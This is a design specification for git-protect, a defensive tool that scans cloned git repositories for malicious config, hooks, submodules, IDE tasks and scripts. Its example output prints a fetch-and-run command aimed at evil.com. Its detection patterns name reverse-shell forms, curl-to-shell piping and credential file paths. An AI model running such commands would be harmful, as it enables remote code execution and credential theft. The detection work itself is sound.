# git-protect: System-Level Protection Against Malicious Git Repositories

**Date:** 2026-05-24
**Status:** Approved
**Review:** Passed Opus security review (24 findings resolved)

## Problem

Developers face increasing attacks via malicious git repositories. Common scenarios include interview test tasks, open-source dependency cloning, and social engineering where the victim clones a repo and unknowingly executes attacker code — resulting in credential theft, malware installation, or full system compromise.

No existing tool defends against inbound malicious repo content at clone time. The entire ecosystem (Gitleaks, TruffleHog, Talisman, git-secrets) focuses on outbound secret prevention — scanning for credentials you accidentally commit. Nobody scans for what a repo might do to YOU.

## Solution

`git-protect` is a Go CLI binary that provides system-level protection against malicious git repositories through three defense layers, ordered by strength:

1. **Safe clone wrapper** (`git-protect clone`) — PRIMARY DEFENSE. Fetches without checkout, scans, then checks out only if safe. This is the only mechanism that blocks threats before any code executes.
2. **Global git hooks** (`core.hooksPath`) — SECONDARY DEFENSE. Post-checkout/post-merge/post-rewrite hooks that scan every checkout. Warning mechanism only (git ignores hook exit codes for post-checkout). Can be suppressed by a malicious local `.git/config` that overrides `core.hooksPath`.
3. **Git config hardening** — BEST-EFFORT FALLBACK. Sets `core.fsmonitor=false`, `safe.bareRepository=explicit`, etc. in global config. Most of these can be overridden by local `.git/config` (see Security Model section).

## Security Model: Git Config Precedence

Git config follows last-one-wins precedence: **system > global > local > worktree > environment**. This means a malicious `.git/config` in a cloned repo can override most global settings. Only `safe.*` keys (like `safe.bareRepository`) are "protected configuration" that git restricts to system/global scope.

**Implications for git-protect:**

| Global setting | Can local `.git/config` override? | Impact |
|---|---|---|
| `core.hooksPath` | **YES** | Attacker can redirect hooks to a directory they control, suppressing our post-checkout hook entirely |
| `core.fsmonitor` | **YES** | Attacker can re-enable fsmonitor with a malicious command despite our global `false` |
| `safe.bareRepository` | **NO** (protected config) | Truly enforced — embedded bare repos are blocked regardless of local config |
| `transfer.fsckObjects` | **YES** | Can be disabled locally, but only affects incoming object validation |

**Defense layer effectiveness by scenario:**

| Scenario | `git-protect clone` | Raw `git clone` + hook | Raw `git clone` alone |
|---|---|---|---|
| Malicious `.git/config` (fsmonitor, pager, etc.) | BLOCKED (scanned pre-checkout) | WARNING (if hook not suppressed) | VULNERABLE |
| Malicious `.git/config` + `core.hooksPath` override | BLOCKED (scanned pre-checkout) | NO WARNING (hook suppressed) | VULNERABLE |
| Embedded bare repos | BLOCKED | WARNING | Protected by `safe.bareRepository` |
| Malicious `.git/hooks/` | BLOCKED | Protected by our `core.hooksPath` (unless locally overridden) | Protected by our `core.hooksPath` (unless locally overridden) |
| Submodule attacks (CVE-2024-32002) | BLOCKED | WARNING | VULNERABLE |

**Conclusion:** `git-protect clone` is the only reliable defense. The global hooks and config hardening are best-effort fallbacks that help in many but not all cases. The `--alias` flag (which routes `git clone` through the wrapper) should be strongly recommended during install.

Additionally, `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>`, `GIT_CONFIG_VALUE_<n>`, `GIT_CONFIG_GLOBAL`, and `GIT_CONFIG_SYSTEM` environment variables can override any config value, including our protections. If an attacker can set environment variables (e.g., via a malicious `.envrc` from a previously cloned repo), they can bypass all config-based defenses. The `devenv` scanner (module 9) detects `.envrc` files that set `GIT_CONFIG_*` variables.

## Architecture

```
+-----------------------------------------------------+
|                   git-protect CLI                    |
+----------+--------------+--------------+------------+
|  clone   |    scan      |   install    |   trust    |
| (proactive) (on-demand) | (setup hooks)| (allowlist)|
+----+-----+------+-------+------+-------+-----+------+
     |            |              |             |
     v            v              v             v
+---------+ +----------+ +-----------+ +-----------+
| Safe    | | Threat   | | Hook      | | Trust     |
| Clone   | | Detection| | Manager   | | Store     |
| Engine  | | Engine   | |           | |           |
+---------+ +----------+ +-----------+ +-----------+
```

### Data Flow: `git-protect clone <url>`

1. `git clone --no-checkout <url> <dir>` — fetches git objects without checking out the working tree. This still creates `.git/config` (with remote URL and branch tracking only — no attacker-controlled values), `.git/hooks/` from `init.templateDir` (if set), and pack files. The working tree is empty.
2. Pre-checkout scan: `.git/config` and `.git/hooks/` directly on disk; `.gitattributes` and `.gitmodules` read via `git ls-tree -r HEAD --name-only | grep` to find all instances, then `git show HEAD:<path>` to read each from the object store (not on disk until checkout).
3. If CRITICAL/HIGH threats found: block with detailed report, remove the cloned directory.
4. If clean or trusted: `git checkout`, then post-checkout verification re-scans `.git/config` and `.git/hooks/` (to catch TOCTOU modifications during checkout), plus scans extracted files (bare-repos, scripts, IDE configs, devenv, unicode, build-hooks, ci-pipelines). Embedded bare repos can also be detected pre-checkout via `git ls-tree -r HEAD --name-only` by looking for paths containing `.git/` segments.
5. If `--recurse-submodules` was requested: do NOT pass it to the initial clone. Instead, after the main repo checkout, iterate `.gitmodules` entries, run `git submodule init`, then clone each submodule individually with the same scan-first approach (no-checkout, scan, checkout). This prevents submodule attacks from executing during the clone.
6. Report summary to user.

Note: partial clones (`--filter=blob:none`) defer blob fetching until checkout. Pre-checkout content scanning is degraded in this case — the user is warned, and the post-checkout pass becomes the primary scan.

### Data Flow: Global post-checkout hook (safety net)

1. Fires after any checkout (clone, switch, pull) — even raw `git clone` without the wrapper.
2. Checks trust store — trusted repos get fast-path exit (near-zero overhead).
3. Runs Threat Detection Engine.
4. If threats found: prints a prominent warning to stderr with threat details.

**Known limitations:**
- The `post-checkout` hook cannot abort or roll back a checkout — the working tree is already updated when the hook runs. However, a non-zero exit code propagates as the exit status of `git checkout`/`git clone`, which signals to wrapper scripts and CI that threats were detected. git-protect's hook exits non-zero when findings are present to surface this signal.
- If a malicious local `.git/config` overrides `core.hooksPath`, the post-checkout hook may not fire at all — the user gets no warning.
- The primary defense is always `git-protect clone`. This hook catches cases where a user does a raw `git clone` and the malicious repo does not suppress our hooks.

### Global Git Config Hardening

`git-protect install` sets these global git config values:

| Config | Value | Overridable by local? | Purpose |
|---|---|---|---|
| `core.hooksPath` | `~/.config/git-protect/hooks/` | YES | Best-effort hook redirection; repos without malicious local config use our hooks |
| `safe.bareRepository` | `explicit` | NO (protected) | Blocks embedded bare repo attacks; truly enforced by git |
| `core.fsmonitor` | `false` | YES | Best-effort fsmonitor disable; helps when no local override exists |
| `transfer.fsckObjects` | `true` | YES | Validates object integrity during fetch; catches malformed objects |
| `core.protectHFS` | `true` | YES | Prevents HFS+ Unicode normalization attacks (macOS) |
| `core.protectNTFS` | `true` | YES | Prevents NTFS alternate data stream and reserved name attacks (Windows) |

These settings improve security for repos that do NOT contain malicious local config. They are NOT absolute protections (except `safe.bareRepository`). The `git-protect clone` wrapper is the primary defense.

## Threat Detection Engine

The scanner analyzes a repo and produces a structured report. Each finding has a severity level:

- **CRITICAL** — immediate code execution risk, always blocks (`--trust` or `--force` to override)
- **HIGH** — likely malicious, blocks by default (`--trust` or `--force` to override)
- **MEDIUM** — suspicious but possibly legitimate, warns but does not block
- **INFO** — noteworthy, verbose mode only

Override mechanisms:
- `--trust` — proceed AND add the repo to the trust store permanently (requires interactive TTY confirmation)
- `--force` — proceed once without adding to the trust store (for one-time clones where permanent trust is not wanted)

### Detection Modules

#### 1. `hooks` — CRITICAL

Scans `.git/hooks/` for any executable files. In a freshly cloned repo, hooks should only come from `init.templateDir`. Any executable hook is suspicious.

#### 2. `config` — CRITICAL

Scans `.git/config` for dangerous directives that execute arbitrary commands:

| Config key | Trigger |
|---|---|
| `core.fsmonitor` | `git status` (IDEs trigger automatically) |
| `core.pager` | `git log`, `git diff`, any paged output |
| `core.editor` | `git commit`, `git rebase -i` |
| `core.sshCommand` | `git fetch`, `git push` |
| `core.askPass` | Any operation needing credentials |
| `core.hooksPath` | Redirects all hook lookups |
| `core.gitProxy` | Proxy command for git:// protocol connections |
| `core.alternateRefsCommand` | Shell command when advertising alternate refs |
| `credential.helper` | Any authenticated git operation |
| `diff.*.textconv` | `git diff`, `git show` |
| `diff.external` | `git diff` |
| `difftool.*.cmd` | `git difftool` |
| `merge.tool` | `git mergetool` |
| `mergetool.*.cmd` | `git mergetool` |
| `filter.*.smudge` | `git checkout` (per-file) |
| `filter.*.clean` | `git add` (per-file) |
| `filter.*.process` | `git checkout`/`git add` (long-running) |
| `alias.*` with `!` prefix | `git <alias>` — shell execution |
| `gpg.program` / `gpg.*.program` | `git commit -S`, `git tag -s` — signing operations |
| `gpg.ssh.defaultKeyCommand` | Signing key lookup |
| `sequence.editor` | `git rebase -i` — interactive rebase |
| `trailer.*.command` / `trailer.*.cmd` | `git interpret-trailers` |
| `remote.*.uploadpack` | `git fetch` — specifies upload-pack command |
| `remote.*.receivepack` | `git push` — specifies receive-pack command |
| `url.*.insteadOf` | Any remote operation — silently rewrites URLs to attacker-controlled servers |
| `http.sslCAInfo` | Any remote operation — MITM via attacker CA cert |
| `http.sslVerify` = `false` | Any remote operation — disables TLS verification, enables MITM |
| `http.proxy` | Any remote operation — traffic redirect |
| `sendemail.smtpserver` | `git send-email` — data exfiltration |

#### 3. `config-include` — CRITICAL

Detects `include.path` and `includeIf.*` directives in `.git/config`. Resolves and scans referenced config files. CVE-2023-29007 showed config injection via overlong submodule URLs can smuggle `include` directives.

#### 4. `attributes` — HIGH

Scans `.gitattributes` in all directories. Pre-checkout discovery uses `git ls-tree -r HEAD --name-only` piped through grep for `.gitattributes`, then `git show HEAD:<path>` for each match. Flags `filter=`, `diff=`, `merge=` attributes with custom drivers — these cause git to execute commands specified in `filter.<name>.smudge`, etc., during checkout.

#### 5. `submodules` — CRITICAL

Scans `.gitmodules` for:
- `ext::` protocol URLs (arbitrary command execution)
- Path traversal (`../`) in submodule paths
- Carriage return smuggling in paths (CVE-2025-48384)
- URLs pointing to non-standard hosts (not github.com, gitlab.com, etc.)

When `--recurse-submodules` is used, each submodule is cloned individually with the same scan-first approach (see Data Flow step 5).

#### 6. `symlinks` — HIGH

Detects any symlink whose target resolves outside the repository tree. On case-insensitive filesystems, also checks for case-confused paths that could escape via CVE-2024-32002 / CVE-2021-21300.

#### 7. `bare-repos` — CRITICAL

Recursively scans the working tree for embedded `.git/` directories (buried bare repositories). On case-insensitive filesystems, also scans for case variants (`.GIT/`, `.Git/`, `.gIt/`, etc.) using a filesystem case-sensitivity probe (stat a temp file with mixed case and check if the same-name different-case file resolves). These embedded repos are the attack surface for `core.fsmonitor` RCE.

#### 8. `ide-configs` — HIGH

Scans for IDE configuration files that auto-execute:

| File | Attack |
|---|---|
| `.vscode/tasks.json` with `"runOn": "folderOpen"` | Auto-executes task on folder open |
| `.vscode/settings.json` | Override interpreters (`python.pythonPath`, `git.path`), terminal env |
| `.idea/` workspace XML files | Auto-run configurations in JetBrains IDEs |

Actively weaponized in the "Contagious Interview" campaign (2025-2026).

#### 9. `devenv` — HIGH

Scans for dev environment hooks:

| File | Attack |
|---|---|
| `.devcontainer/devcontainer.json` | `postCreateCommand`, `postStartCommand`, `postAttachCommand` lifecycle hooks; exfiltrates `GITHUB_TOKEN` in Codespaces |
| `.envrc` | Auto-executes via direnv on `cd` into directory |
| `.envrc` with `GIT_CONFIG_*` | Sets git config environment variables that bypass all config-based protections |

#### 10. `scripts` — MEDIUM

Heuristic scan of shell, Python, and JavaScript files for exfiltration patterns:

**Credential access:**
- `~/.ssh/id_rsa`, `~/.ssh/id_ed25519`
- `~/.aws/credentials`, `~/.aws/config`
- `~/.gnupg/`, `~/.config/gcloud/`
- `$AWS_SECRET_ACCESS_KEY`, `$GITHUB_TOKEN`, `$NPM_TOKEN`

**Network exfiltration:**
- `curl ... | sh`, `wget ... | bash`
- `/dev/tcp/`, `nc -e`, `bash -i >& /dev/tcp/`
- `python -c "import socket"`

**Obfuscation:**
- `eval(base64_decode(...))`, `echo ... | base64 -d`
- `\x` hex escape sequences in shell scripts
- `python -c "exec(...)"`

#### 11. `build-hooks` — MEDIUM

Scans package manager and build tool configs:

| File | Pattern |
|---|---|
| `package.json` | `preinstall`, `postinstall`, `prepare` scripts |
| `Makefile` | `$(shell ...)` invocations |
| `setup.py` / `setup.cfg` | `subprocess`, `os.system` calls |
| `.cargo/config.toml` | Build scripts with network access |

#### 12. `unicode` — MEDIUM

Scans source files for:
- **BiDi control characters** (Trojan Source / CVE-2021-42574): Unicode directional override characters that reorder how code appears vs. how it executes
- **Homoglyph identifiers** (CVE-2021-42694): Visually identical Unicode characters substituting for ASCII in function/variable names

#### 13. `ci-pipelines` — MEDIUM

Scans CI/CD pipeline definitions for suspicious steps:
- `.github/workflows/*.yml` — uses of `actions/checkout` with untrusted refs, `run:` steps with suspicious commands, `curl|sh` patterns
- `.gitlab-ci.yml` — `script:` steps with network exfiltration patterns

## CLI Commands

### `git-protect install`

Sets up global protection. Idempotent — safe to run multiple times.

```
$ git-protect install

  Setting up global git protection...

  [ok] core.hooksPath = ~/.config/git-protect/hooks/
  [ok] safe.bareRepository = explicit
  [ok] core.fsmonitor = false
  [ok] transfer.fsckObjects = true
  [ok] core.protectHFS = true
  [ok] core.protectNTFS = true
  [ok] Installed post-checkout hook
  [ok] Installed post-merge hook
  [ok] Installed post-rewrite hook
  [ok] Created trust store at ~/.config/git-protect/trust.toml (mode 0600)

  RECOMMENDED: Run 'git-protect install --alias' to route 'git clone'
  through the safe-clone wrapper for maximum protection.

  Protection active. All future clones and checkouts will be scanned.
```

Detects and handles conflicts with existing `core.hooksPath` settings (Husky, pre-commit, Lefthook) by offering to wrap existing hooks.

Flags:
- `--alias` — sets `git config --global alias.clone '!<absolute-path-to-git-protect> clone'` for transparent protection. Uses the resolved absolute path of the binary (not a bare name) to prevent PATH hijacking. Note: the alias value is stored in `~/.gitconfig` — its integrity depends on the user's home directory permissions.
- `--dry-run` — show what would be changed without applying

### `git-protect uninstall`

Removes all global config changes, restores original values, removes hooks directory.

### `git-protect clone <url> [<dir>]`

Safe clone: `--no-checkout` then scan then checkout.

```
$ git-protect clone https://github.com/suspicious-corp/interview-task.git

  Cloning (no-checkout)... done.
  Scanning for threats...

  CRITICAL  .git/config: core.fsmonitor = "curl http://evil.com/c.sh|sh"
  HIGH      .vscode/tasks.json: task "setup" has runOn: folderOpen
  HIGH      .gitattributes: filter "build" on *.c -- smudge: "./scripts/inject.sh"

  BLOCKED -- 3 threats found. Repository has NOT been checked out.

  Actions:
    git-protect clone --show-threats <url>    Full threat analysis
    git-protect clone --force <url>           Clone once without trusting
    git-protect clone --trust <url>           Clone and add to trustlist

  Cleaned up: ./interview-task removed.
```

On clean scan:

```
$ git-protect clone https://github.com/legit-org/real-project.git

  Cloning (no-checkout)... done.
  Scanning for threats... clean.
  Checking out... done.
  Post-checkout verification... clean.

  Repository cloned safely to ./real-project
```

Flags:
- `--show-threats` — detailed analysis of each finding
- `--force` — clone once despite threats, do NOT add to trust store
- `--trust` — clone despite threats AND add repo to trust store permanently (requires interactive TTY; rejected if stdin is not a TTY)
- `--json` — machine-readable output
- `--bare` / `--mirror` — handled specially: scans config (which is `./config` in a bare repo) and `.gitmodules`; skips working-tree scans (IDE configs, scripts, etc.) since there is no working tree
- All other standard `git clone` flags are passed through (e.g., `--depth`, `--branch`)
- `--recurse-submodules` is intercepted and handled by git-protect's own submodule scanning loop (see Data Flow step 5)

### `git-protect scan [<dir>]`

Scan an existing repo on disk.

```
$ git-protect scan

  Scanning ./some-repo...

  MEDIUM    package.json: postinstall script runs "node scripts/setup.js"
  MEDIUM    scripts/setup.js: contains curl to external URL (line 14)

  2 MEDIUM findings. No critical threats.
```

Flags:
- `--json` — machine-readable output for CI integration
- `-v` / `--verbose` — detailed info on each finding
- `--severity <level>` — filter by minimum severity (critical, high, medium, info)
- `--modules <list>` — run specific scanner modules only
- `--exit-code` — exit non-zero on findings at or above threshold (for CI gating)

### `git-protect trust`

Manage the trust/allowlist.

```
$ git-protect trust list
$ git-protect trust add <pattern>      # requires interactive TTY confirmation; use -y to skip prompt
$ git-protect trust remove <pattern>
$ git-protect trust check [--quiet]    # check if current repo is trusted
```

### `git-protect status`

Show current protection status.

```
$ git-protect status

  git-protect v0.1.0

  Protection:
    core.hooksPath        ~/.config/git-protect/hooks/    active (overridable by local config)
    safe.bareRepository   explicit                        active (enforced)
    core.fsmonitor        false                           active (overridable by local config)
    transfer.fsckObjects  true                            active (overridable by local config)
    clone alias           not set                         recommended

  Warnings:
    safe.directory = *                                    UNSAFE — accepts repos owned by other users

  Trust store: ~/.config/git-protect/trust.toml (2 entries, mode 0600)
  Detection modules: 13 loaded
```

### `git-protect version`

```
$ git-protect version
  git-protect v0.1.0 (go1.22, linux/amd64)

$ git-protect version --check
  git-protect v0.1.0 (go1.22, linux/amd64)
  Latest: v0.1.2 — update available at https://github.com/<org>/git-protect/releases
```

The `--check` flag fetches from the GitHub Releases API (unauthenticated GET, no telemetry or identifying information sent). Times out after 3 seconds and fails silently (version is still printed without the update line). Disable with `--no-check-update` or `GIT_PROTECT_NO_UPDATE_CHECK=1`.

## Trust System

### Trust Store

Location: `~/.config/git-protect/trust.toml`

```toml
[[trust]]
pattern = "github.com/mycompany/*"
type = "org"
added = 2026-05-20
note = "Internal org, all repos verified"

[[trust]]
pattern = "github.com/torvalds/linux"
type = "repo"
added = 2026-05-18

[[trust]]
pattern = "gitlab.internal.corp/*"
type = "host"
added = 2026-05-15
note = "Corporate GitLab instance"
```

### Trust Types

- `repo` — exact match on a single repository URL
- `org` — wildcard on an organization/group (`github.com/mycompany/*`)
- `host` — wildcard on an entire host (`gitlab.internal.corp/*`)

### Trust Store Security

- File permissions: mode `0600` (owner read/write only), enforced on creation and verified on read
- Ownership: must be owned by the current user; refuse to read if owned by another user
- Symlink protection: refuse to read if the trust store path is a symlink
- Atomic writes: write to a temp file, fsync, then rename to prevent partial writes
- Integrity: plain TOML for v1; optional HMAC signing with user-derived key considered for future high-security environments

### Trust Behavior

Even for trusted repos, the scanner always runs in **detect-and-report** mode — findings are printed as INFO but do not block. This catches supply chain attacks where a trusted org's repo is compromised. There is no way to skip scanning entirely — trust affects blocking behavior, not detection.

### Matching Rules

- URLs normalized before matching: strip protocol, `.git` suffix, trailing slashes, `user@` prefix, default ports (443 for HTTPS, 22 for SSH)
- SSH URLs (`git@github.com:org/repo.git`) normalized to `github.com/org/repo` — colon-separated host:path converted to slash-separated
- IDN/punycode hostnames normalized to ASCII (prevents homograph attacks like `g&#x456;thub.com` matching `github.com`)
- Percent-encoded path segments decoded before matching
- `url.*.insteadOf` rewrites resolved before trust matching (via `git config --get-urlmatch`) to catch URL rewriting attacks
- Local path clones (`file:///path` or bare `/path`) are always scanned and cannot be trusted by path
- `--trust` flag requires interactive TTY confirmation ("Are you sure you want to trust this repository? [y/N]"). Rejected if stdin is not a TTY — use `git-protect trust add <url>` explicitly instead
- Nothing trusted by default — not even github.com

## Hook Integration and Chaining

### Hooks Directory

`~/.config/git-protect/hooks/` contains:
- `post-checkout` — scans after any checkout (clone, switch, pull)
- `post-merge` — scans after merge (catches `git pull` with merge strategy)
- `post-rewrite` — scans after rebase (catches `git pull --rebase` and `git rebase`)

### Hook Chaining

When `core.hooksPath` overrides `.git/hooks/`, legitimate project hooks stop working. We solve this:

1. Our hooks check if the current repo has hooks in `.git/hooks/` or a custom hooks directory
2. If the repo is **trusted**, our hooks scan the repo's hooks for threats first (detect-and-report), then execute them. Trust skips blocking, not detection.
3. If the repo is **not trusted**, repo hooks are NOT chained (they could be malicious)

### Compatibility with Hook Managers

Users of Husky, pre-commit, or Lefthook typically set `core.hooksPath` themselves. `git-protect install` detects this and:

1. Warns about the conflict
2. Offers to wrap the existing hooks path — our hooks run first, then chain to the original path
3. Stores the original `core.hooksPath` value for restoration on uninstall

### Operations Coverage

| Git operation | Hook that fires | Covered? |
|---|---|---|
| `git clone` | `post-checkout` | Yes |
| `git checkout` / `git switch` | `post-checkout` | Yes |
| `git pull` (merge) | `post-merge` | Yes |
| `git pull --rebase` | `post-rewrite` | Yes |
| `git rebase` | `post-rewrite` | Yes |
| `git worktree add` | `post-checkout` | Yes (worktrees inherit main repo trust; `config.worktree` scanned by config module) |
| `git sparse-checkout add/set` | `post-checkout` | Yes (fires on sparse-checkout reapply) |
| `git clone --bare/--mirror` | None | No hook fires; requires `git-protect clone` wrapper |
| `git fetch` | None | Not covered (no user-facing hook); `transfer.fsckObjects` validates objects |
| `git archive` | None | Not covered; produces a tarball, not a repo |

## Technology Choices

| Choice | Rationale |
|---|---|
| Go | Single binary, no runtime deps, fast, cross-platform, strong CLI ecosystem (cobra/viper) |
| TOML for trust store | Human-readable, easy to edit manually, standard for config files |
| XDG paths (`~/.config/git-protect/`) | Follows Linux conventions, overridable via `$XDG_CONFIG_HOME`. On macOS, `~/.config/` is used (consistent with git's own behavior); native `~/Library/Application Support/` is not used to avoid divergent paths |
| Modular scanner design | Each detection module is independent — easy to add new modules, test in isolation |

## Testing Strategy

- **Unit tests**: Each of the 13 detection modules tested with crafted malicious fixtures
- **Integration tests**: Full `git-protect clone` flow with git repos containing known attack patterns
- **CVE regression tests**: Specific test cases for CVE-2024-32002, CVE-2024-32465, CVE-2025-48384, CVE-2021-42574, CVE-2023-29007
- **Config precedence tests**: Verify behavior when local `.git/config` overrides global settings (F1/F2 regression)
- **TOCTOU tests**: Verify post-checkout re-scan catches `.git/config` modifications during checkout
- **False positive tests**: Scan popular repos (linux kernel, kubernetes, go stdlib) to verify low false-positive rate
- **Hook chaining tests**: Verify legitimate hooks work in trusted repos
- **Submodule tests**: Recursive clone with malicious submodule configs
- **Trust store tests**: Permission checks, symlink rejection, atomic writes, IDN normalization
- **Performance**: Scanning overhead under 500ms for repos up to 10k files. For repos exceeding 50k files, CRITICAL/HIGH modules run by default; full scan available via `--full`. Timeout of 30s with clear message for very large repos.

## Future Roadmap (not in v1)

- **eBPF enforcement layer**: Kernel-level interception via LSM hooks — defense in depth that cannot be bypassed by config overrides
- **Signature database**: Community-updated known-malicious payload signatures
- **System packages**: rpm/deb for enterprise deployment with auto-config
- **CI integration**: GitHub Action / GitLab CI template for `git-protect scan` on incoming PRs
- **IDE extensions**: VS Code / JetBrains plugins that trigger scan on project open
- **Trust store HMAC signing**: Cryptographic integrity for the trust store in high-security environments
- **Self-update**: `git-protect update` to fetch and install the latest release
